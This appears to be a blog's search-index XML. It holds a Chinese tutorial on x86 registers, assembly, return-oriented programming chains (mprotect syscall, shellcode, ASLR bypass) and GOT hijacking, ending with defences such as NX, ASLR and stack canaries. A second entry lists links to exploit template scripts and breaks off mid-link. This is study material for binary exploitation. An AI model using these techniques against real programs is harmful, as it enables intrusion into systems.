<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2024/09/16/%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0x20-相关知识"><a href="#0x20-相关知识" class="headerlink" title="*0x20* 相关知识"></a>*<strong>0x20* 相关知识</strong></h2><h2 id="0x21-寄存器"><a href="#0x21-寄存器" class="headerlink" title="0x21 寄存器"></a><em>0x21</em> 寄存器</h2><p>在上篇的背景知识中，我们提到了函数状态相关的三个寄存器－－esp，ebp，eip。下面的内容会涉及更多的寄存器，所以我们大致介绍下寄存器在执行程序指令中的不同用途。</p><p>32位x86架构下的寄存器可以被简单分为<strong>通用寄存器</strong>和<strong>特殊寄存器</strong>两类，通用寄存器在大部分汇编指令下是可以任意使用的（虽然有些指令规定了某些寄存器的特定用途），而特殊寄存器只能被特定的汇编指令使用，不能用来任意存储数据。</p><p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi），以及堆栈指针寄存器（esp、ebp）。</p><p>一般寄存器用来存储运行时数据，是指令最常用到的寄存器，除了存放一般性的数据，每个一般寄存器都有自己较为固定的独特用途。eax 被称为累加寄存器（<strong>A</strong>ccumulator），用以进行算数运算和返回函数结果等。ebx 被称为基址寄存器（<strong>B</strong>ase），在内存寻址时（比如数组运算）用以存放基地址。ecx 被称为记数寄存器（<strong>C</strong>ounter），用以在循环过程中记数。edx 被称为数据寄存器（<strong>D</strong>ata），常配合 eax 一起存放运算结果等数据。</p><p>索引寄存器通常用于字符串操作中，esi 指向要处理的数据地址（<strong>S</strong>ource <strong>I</strong>ndex），edi 指向存放处理结果的数据地址（<strong>D</strong>estination <strong>I</strong>ndex）。</p><p>堆栈指针寄存器（esp、ebp）用于保存函数在调用栈中的状态，上篇已有详细的介绍。</p><p>32位x86架构下的特殊寄存器包括段地址寄存器（ss、cs、ds、es、fs、gs），标志位寄存器（EFLAGS），以及指令指针寄存器（eip）。</p><p>现代操作系统内存通常是以分段的形式存放不同类型的信息的。我们在上篇谈及的函数调用栈就是分段的一个部分（Stack Segment）。内存分段还包括堆（Heap Segment）、数据段（Data Segment），BSS段，以及代码段（Code Segment）。代码段存储可执行代码和只读常量（如常量字符串），属性可读可执行，但通常不可写。数据段存储已经初始化且初值不为0的全局变量和静态局部变量，BSS段存储未初始化或初值为0的全局变量和静态局部变量，这两段数据都有可写的属性。堆用于存放程序运行中动态分配的内存，例如C语言中的 malloc() 和 free() 函数就是在堆上分配和释放内存。各段在内存的排列如下图所示。</p><p><img src="https://pic3.zhimg.com/80/v2-b0a32bf3eab19ce9a7611be1bf9dd1b2_1440w.webp" alt="img"></p><p><strong>Fig1. 内存分段的典型布局</strong></p><p>段地址寄存器就是用来存储内存分段地址的，其中寄存器 ss 存储函数调用栈（<strong>S</strong>tack <strong>S</strong>egment）的地址，寄存器 cs 存储代码段（<strong>C</strong>ode <strong>S</strong>egment）的地址，寄存器 ds 存储数据段（<strong>D</strong>ata <strong>S</strong>egment）的地址，es、fs、gs 是附加的存储数据段地址的寄存器。</p><p>标志位寄存器（EFLAGS）32位中的大部分被用于标志数据或程序的状态，例如 OF（<strong>O</strong>verflow <strong>F</strong>lag）对应数值溢出、IF（<strong>I</strong>nterrupt <strong>F</strong>lag）对应中断、ZF（<strong>Z</strong>ero <strong>F</strong>lag）对应运算结果为0、CF（<strong>C</strong>arry <strong>F</strong>lag）对应运算产生进位等等。</p><p>指令指针寄存器（eip）存储下一条运行指令的地址，上篇已有详细的介绍。</p><h2 id="0x22-汇编指令"><a href="#0x22-汇编指令" class="headerlink" title="0x22 汇编指令"></a><em>0x22</em> 汇编指令</h2><p>为了更好地理解后面的内容，一点点汇编语言的知识也是必要的，本节会介绍一些基础指令的含义。32位x86架构下的汇编语言有 Intel 和 AT&amp;T 两种格式，本文所用汇编指令都是 Intel 格式。两者最主要的差别如下。</p><p>Intel 格式，寄存器名称和数值前无符号：</p><blockquote><p><em>“指令名称 目标操作数 DST，源操作数 SRC”</em></p></blockquote><p>AT&amp;T 格式，寄存器名称前加“%”，数值前加“$”：</p><blockquote><p>*“指令名称 源操作数 SRC，目标操作数 DST”<br>*</p></blockquote><p>一些最常用的汇编指令如下：</p><ul><li><p>MOV：数据传输指令，将 SRC 传至 DST，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">MOV DST, SRC;<br></code></pre></td></tr></table></figure></li><li><p>PUSH：压入堆栈指令，将 SRC 压入栈内，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">PUSH SRC;<br></code></pre></td></tr></table></figure></li><li><p>POP：弹出堆栈指令，将栈顶的数据弹出并存至 DST，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">POP DST;<br></code></pre></td></tr></table></figure></li><li><p>LEA：取地址指令，将 MEM 的地址存至 REG ，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">LEA REG, MEM;<br></code></pre></td></tr></table></figure></li><li><p>ADD／SUB：加／减法指令，将运算结果存至 DST，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ADD/SUB DST, SRC;<br></code></pre></td></tr></table></figure></li><li><p>AND／OR／XOR：按位与／或／异或，将运算结果存至 DST ，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">AND/OR/XOR DST，SRC;<br></code></pre></td></tr></table></figure></li><li><p>CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">CALL PTR;<br></code></pre></td></tr></table></figure></li><li><p>RET：返回指令，操作为将栈顶数据弹出至 eip，格式为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">RET;<br></code></pre></td></tr></table></figure></li></ul><p>介绍完以上背景知识，就可以继续栈溢出技术之路了。</p><h2 id="0x30-ROP-Return-Oriented-Programming"><a href="#0x30-ROP-Return-Oriented-Programming" class="headerlink" title="*0x30* ROP ( Return Oriented Programming )"></a>*<strong>0x30* ROP ( Return Oriented Programming )</strong></h2><p><em>－－修改返回地址，让其指向内存中已有的一段指令</em></p><p>根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回地址并定位到内存地址，为什么不直接用上篇提到的 return2libc 呢？因为有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造（padding 长度和内容的确定方式参见上篇）：</p><blockquote><p><strong>payload :</strong> padding + address of gadget</p></blockquote><p><img src="https://pic4.zhimg.com/80/v2-35aea782bea2ce6bca9fa15997e1c897_1440w.webp" alt="img"></p><p><strong>Fig 2. 包含单个 gadget 的溢出数据</strong></p><p>如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( <strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + address of gadget 2 + ……<br>+ address of gadget n</p></blockquote><p>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行 gadget 2，以此类推。</p><p><img src="https://pic1.zhimg.com/80/v2-a4964a02ab5a974439a157cf9d5b017c_1440w.webp" alt="img"></p><p><strong>Fig 3. 包含多个 gadget 的溢出数据</strong></p><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。</p><p>首先，栈溢出之后要实现什么效果？</p><p>ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是 int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中。例如，编号125对应函数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">mprotect (void *addr, size_t len, int prot)<br></code></pre></td></tr></table></figure><p>，可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p><p>其次，如何寻找对应的指令片段？</p><p>有若干开源工具可以实现搜索以 ret 结尾的指令片段，著名的包括 <strong>ROPgadget</strong>、<strong>rp++<strong>、</strong>ropeme</strong> 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 再进一步筛选。搜索的详细过程在这里就不再赘述，有兴趣的同学可以参考上述工具的说明文档。</p><p>最后，如何传入系统调用的参数？</p><p>对于上面提到的 mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在 gadget 地址之后，如下图所示。</p><p><img src="https://pic4.zhimg.com/80/v2-07a48918aeb2f8b7dd2ddc4836a7b773_1440w.webp" alt="img"></p><p><strong>Fig 4. gadget “pop eax; ret;”</strong></p><p>在调用 mprotect() 为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。但确定 shellcode 在内存的确切地址是很困难的事（想起上篇里面艰难试探的过程了吗？），我们可以使用 push esp 这个 gadget（加入可以找到的话）。</p><p><img src="https://pic2.zhimg.com/80/v2-cd2cc25282b444489d84130dae609f19_1440w.webp" alt="img"></p><p><strong>Fig 5. gadget “push esp; ret;”</strong></p><p>我们假设现在内存中可以找到如下几条指令：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">pop eax; ret;    # pop stack top into eax<br>pop ebx; ret;    # pop stack top into ebx<br>pop ecx; ret;    # pop stack top into ecx<br>pop edx; ret;    # pop stack top into edx<br>int 0x80; ret;   # system call<br>push esp; ret;   # push address of shellcode<br></code></pre></td></tr></table></figure><p>对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + address of gadget n + shellcode</p></blockquote><p><img src="https://pic2.zhimg.com/80/v2-b7eb6db6876fa1dbbc128fb1780649e9_1440w.webp" alt="img"></p><p><strong>Fig 6. 包含多个 gadget 的溢出数据（修改后）</strong></p><p>此处为了简单，先假定输入溢出数据不受“\x00”字符的影响，所以 payload 可以直接包含 “\x7d\x00\x00\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">pop eax; ret;         # pop stack top 0x1111118e into eax<br>pop ebx; ret;         # pop stack top 0x11111111 into ebx<br>sub eax, ebx; ret;    # eax -= ebx<br></code></pre></td></tr></table></figure><p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。同时，由于 ROP 方法带来的灵活性，现在不再需要痛苦地试探 shellcode 起始地址了。回顾整个输入数据，只有栈的分段地址需要获取确定地址。如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了绕过内存随机化的可能。</p><p>出于演示的目的，我们假设（简直是<em>钦点</em>）了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。</p><p>第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">pop ebx; ret; <br></code></pre></td></tr></table></figure><p>但假如可以找到下面的 gadget</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">mov ebx, eax; ret;<br></code></pre></td></tr></table></figure><p>我们就可以将它和</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">pop eax; ret; <br></code></pre></td></tr></table></figure><p>组合起来实现将数据传输给 ebx 的功能。上面提到的用多个 gadget 避免输入“\x00”也是一个实例应用。</p><p>第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心 gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。</p><h2 id="0x40-Hijack-GOT"><a href="#0x40-Hijack-GOT" class="headerlink" title="*0x40* Hijack GOT"></a>*<strong>0x40* Hijack GOT</strong></h2><p><em>－－修改某个被调用函数的地址，让其指向另一个函数</em></p><p>根据上面副标题的说明，要完成的任务包括：在内存中修改某个函数的地址，使其指向另一个函数。为了便于理解，不妨假设修改 printf() 函数的地址使其指向 system()，这样修改之后程序内对 printf() 的调用就执行 system() 函数。要实现这个过程，我们就要弄清楚发生函数调用时程序是如何“找到”被调用函数的。</p><p>程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。</p><p>可程序是如何在链接库内定位到所需的函数呢？这个过程用到了两张表－－GOT 和 PLT。GOT 全称是全局偏移量表（<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。那么 PLT 表内存储的入口点是什么呢？就是 GOT 表中对应条目的地址。</p><p><img src="https://pic3.zhimg.com/80/v2-e53f1d43a7191e3ea6922bea253bccbe_1440w.webp" alt="img"></p><p><strong>Fig 7. PLT 和 GOT 表</strong></p><p>等等，我们好像发现了一个不合理的地方，外部函数的内存地址存储在 GOT 而非 PLT 表内，PLT 存储的入口点又指向 GOT 的对应条目，那么程序为什么选择 PLT 而非 GOT 作为调用的入口点呢？在程序启动时确定所有外部函数的内存地址并写入 GOT 表，之后只使用 GOT 表不是更方便吗？这样的设计是为了程序的运行效率。GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。整个过程如下面两张图所示。</p><p><img src="https://pic3.zhimg.com/80/v2-b78288c5eb8bfd2568728f34fbbb0e9e_1440w.webp" alt="img"></p><p><strong>Fig 8. 第一次调用函数时解析函数地址并存入 GOT 表</strong></p><p><img src="https://pic4.zhimg.com/80/v2-caa5320d0bb0101edad4b9127f6fe413_1440w.webp" alt="img"></p><p><strong>Fig 9. 再次调用函数时直接读取 GOT 内的地址</strong></p><p>上述实现遵循的是一种被称为 *<strong>LAZY*</strong> 的设计思想，它将需要完成的操作（解析外部函数的内存地址）留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。这个过程也启示了我们如何实现函数的伪装，那就是到 GOT 表中将函数 A 的地址修改为函数 B 的地址。这样在后面所有对函数 A 的调用都会执行函数 B。</p><p>那么我们的目标可以分解为如下几部分：确定函数 A 在 GOT 表中的条目位置，确定函数 B 在内存中的地址，将函数 B 的地址写入函数 A 在 GOT 表中的条目。</p><p>首先，如何确定函数 A 在 GOT 表中的条目位置？</p><p>程序调用函数时是通过 PLT 表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到 PLT 表中该函数的入口点位置，从而定位到该函数在 GOT 中的条目。</p><p>例如</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">call 0x08048430 &lt;printf@plt&gt;<br></code></pre></td></tr></table></figure><p>就说明 printf 在 PLT 表中的入口点是在 <em>0x08048430</em>，所以 <em>0x08048430</em> 处存储的就是 GOT 表中 printf 的条目地址。</p><p>其次，如何确定函数 B 在内存中的地址？</p><p>如果系统开启了内存布局随机化，程序每次运行动态链接库的加载位置都是随机的，就很难通过调试工具直接确定函数的地址。假如函数 B 在栈溢出之前已经被调用过，我们当然可以通过前一个问题的答案来获得地址。但我们心仪的攻击函数往往并不满足被调用过的要求，也就是 GOT 表中并没有其真实的内存地址。幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数 A 的运行时地址（读取 GOT 表内容），也知道函数 A 和函数 B 在动态链接库内的相对位置，就可以推算出函数 B 的运行时地址。</p><p>最后，如何实现 GOT 表中数据的修改？</p><p>很难找到合适的函数来完成这一任务，不过我们还有强大的 ROP（DIY大法好）。假设我们可以找到以下若干条 gadget（继续<em>钦点</em>），就不难改写 GOT 表中数据，从而实现函数的伪装。ROP 的具体实现请回看上一章，这里就不再赘述了。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">pop eax; ret; # printf@plt -&gt; eax<br>mov ebx [eax]; ret;# printf@got -&gt; ebx<br>pop ecx; ret; # addr_diff = system - printf -&gt; ecx<br>add [ebx] ecx; ret; # printf@got += addr_diff<br></code></pre></td></tr></table></figure><p>从修改 GOT 表的过程可以看出，这种方法也可以在一定程度上绕过内存随机化。</p><h2 id="0x50-防御措施"><a href="#0x50-防御措施" class="headerlink" title="*0x50* 防御措施"></a>*<strong>0x50* 防御措施</strong></h2><p>介绍过几种栈溢出的基础方法，我们再来补充一下操作系统内有哪些常见的措施可以进行防御。首先，通常情况下程序在默认编译设置下都会取消栈上数据的可执行权限，这样简单的 shellcode 溢出攻击就无法实现了。其次，可以在操作系统内开启内存布局随机化（ASLR），这样可以增大确定堆栈内数据和动态库内函数的内存地址的难度。编译程序时还可以设置某些编译选项，使程序在运行时会在函数栈上的 ebp 地址和返回地址之间生成一个特殊的值，这个值被称为“金丝雀”（关于这个典故，请大家自行谷歌）。这样一旦发生了栈溢出并覆盖了返回地址，这个值就会被改写，从而实现函数栈的越界检查。最后值得强调的是，尽可能写出安全可靠的代码，不给栈溢出提供写入越界的可能。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E6%A8%A1%E6%9D%BF(%E6%A0%88payload%E4%BB%8E%E5%8F%B3%E5%90%91%E5%B7%A6%E5%85%A5%E6%A0%88)/"/>
    <url>/2024/09/16/%E6%A8%A1%E6%9D%BF(%E6%A0%88payload%E4%BB%8E%E5%8F%B3%E5%90%91%E5%B7%A6%E5%85%A5%E6%A0%88)/</url>
    
    <content type="html"><![CDATA[<h2 id="log-success-“stdin-”-hex-addrs"><a href="#log-success-“stdin-”-hex-addrs" class="headerlink" title="log.success(“stdin:”+hex(addrs))"></a>log.success(“stdin:”+hex(addrs))</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600328-678fa433-ad64-4f1c-8ea5-1ea2391432e1.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600328-678fa433-ad64-4f1c-8ea5-1ea2391432e1.py%22,%22name%22:%222.32uaf.py%22,%22size%22:1229,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u855ddef2-340f-485d-bcbf-5c209462cd3%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u91f72157%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">2.32uaf.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600301-6b61db0d-db74-4a11-8e6f-c953434aee7a.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600301-6b61db0d-db74-4a11-8e6f-c953434aee7a.py%22,%22name%22:%22Canary.py%22,%22size%22:359,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u4913cdb4-9ca7-4bc0-b273-e6e2b8911f8%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u894bc124%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">Canary.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600307-25c56ad4-4c91-4d19-96ce-09652a4cb4aa.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600307-25c56ad4-4c91-4d19-96ce-09652a4cb4aa.py%22,%22name%22:%22double_free%20uaf.py%22,%22size%22:866,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u5b0e5151-edf1-4a1f-960d-6b1faff2500%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u7b52abd1%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">double_free+uaf.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600313-408594c1-c6b5-4db3-9619-8d9bb89eba6c.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600313-408594c1-c6b5-4db3-9619-8d9bb89eba6c.py%22,%22name%22:%22format.py%22,%22size%22:1322,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:false,%22taskId%22:%22u992ae3c5-484d-4a45-8749-f6e74a1e573%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u78643ba1%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">format.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600301-80e3bbc2-cbbc-4f55-8e15-b6bb9938df09.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600301-80e3bbc2-cbbc-4f55-8e15-b6bb9938df09.py%22,%22name%22:%22heap.py%22,%22size%22:420,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u96b7eef3-aef0-4e7c-8e96-d17cbfdd496%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u82cee692%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">heap.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600493-ecacb58d-c84f-4334-915e-c33d21c6e7b5.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600493-ecacb58d-c84f-4334-915e-c33d21c6e7b5.py%22,%22name%22:%22int.py%22,%22size%22:222,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ua5a2fe2a-0c60-4e73-ae8d-dbbd2ba3631%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ud1bfacae%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">int.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600509-60256962-5707-453b-b3c1-1c2123ef4ac7.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600509-60256962-5707-453b-b3c1-1c2123ef4ac7.py%22,%22name%22:%22IO_FILE.py%22,%22size%22:1681,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22uc9967b6f-a2bb-4b55-8cbe-c4b89435899%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u9517f91f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">IO_FILE.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600518-be12da62-8815-4b7e-9500-254ae19889c8.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600518-be12da62-8815-4b7e-9500-254ae19889c8.py%22,%22name%22:%22ret2_libc32.py%22,%22size%22:732,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u1abd3d20-f427-4ac9-825f-401124bcba6%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u2553903d%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">ret2_libc32.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600521-0e168e83-6530-4ef1-9f6a-65e0e48b75da.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600521-0e168e83-6530-4ef1-9f6a-65e0e48b75da.py%22,%22name%22:%22ret2_libc64.py%22,%22size%22:844,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u924bbd56-4d90-4f1d-aa54-643b0892bed%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22uee3b4ef4%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">ret2_libc64.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600535-5deb5530-efa0-4c40-b1be-726fa7307732.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600535-5deb5530-efa0-4c40-b1be-726fa7307732.py%22,%22name%22:%22ret2_shellcode.py%22,%22size%22:150,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u3c65bdaf-948d-45d1-9bd3-d30d7cf63b7%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u1636fd92%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">ret2_shellcode.py</a><a href="https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600677-1ac9ae4d-87e4-4456-8453-2e061dede52d.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/33529366/1685163600677-1ac9ae4d-87e4-4456-8453-2e061dede52d.py%22,%22name%22:%22ret2_text.py%22,%22size%22:527,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22uca5457ad-b785-4feb-9055-047c78ee45f%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u264ca1ec%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">ret2_text.py</a><a 